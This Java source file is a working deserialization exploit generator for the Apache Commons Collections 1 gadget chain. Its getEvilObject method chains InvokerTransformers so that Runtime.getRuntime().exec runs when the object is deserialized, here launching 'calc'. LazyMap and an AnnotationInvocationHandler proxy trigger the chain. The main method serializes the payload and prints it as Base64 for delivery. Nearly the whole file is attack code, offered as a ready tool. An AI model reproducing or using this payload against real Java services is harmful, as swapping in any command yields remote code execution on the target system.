package com.deserialize.payload;

import org.apache.commons.codec.binary.Base64;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1All {

    public static void main(String... args) throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException {
        Object evilObject = getEvilObject(); //create object to exploit deserialization
        byte[] serializedObject = serializeToByteArray(evilObject);
        System.out.println("Serialized object: \n" + Base64.encodeBase64String(serializedObject));
//        deserializeFromByteArray(serializedObject); //try to deserialize payload
    }

    public static Object getEvilObject() throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, InvocationTargetException {

        // RCE with LazyMap and ChainedTransformer
        String[] command = {"calc"};
        final Transformer[] transformers = new Transformer[]{

                new ConstantTransformer(Runtime.class),

                new InvokerTransformer("getMethod",
                        new Class[]{ String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),

                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),

                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        command
                )
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map map = new HashMap();
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);

//        lazyMap.get("gursev"); // make chainedTransformer execute // comment this line

        // Chain from deserialization to LazyMap.get()
        String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
        final Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
        Proxy evilProxy = (Proxy) Proxy.newProxyInstance(CommonsCollections1All.class.getClassLoader(), new Class[] {Map.class}, secondInvocationHandler );
        InvocationHandler invocationHandlerToSerialize = (InvocationHandler) constructor.newInstance(Override.class, evilProxy);
        return invocationHandlerToSerialize;

    }


    public static byte[] serializeToByteArray(Object object) throws IOException {
        ByteArrayOutputStream serializedObjectOutputContainer = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(serializedObjectOutputContainer);
        objectOutputStream.writeObject(object);
        return serializedObjectOutputContainer.toByteArray();
    }

    public static Object deserializeFromByteArray(byte[] serializedObject) throws IOException, ClassNotFoundException {
        ByteArrayInputStream serializedObjectInputContainer = new ByteArrayInputStream(serializedObject);
        ObjectInputStream objectInputStream = new ObjectInputStream(serializedObjectInputContainer);
        InvocationHandler evilInvocationHandler = (InvocationHandler) objectInputStream.readObject();
        return evilInvocationHandler;
    }
}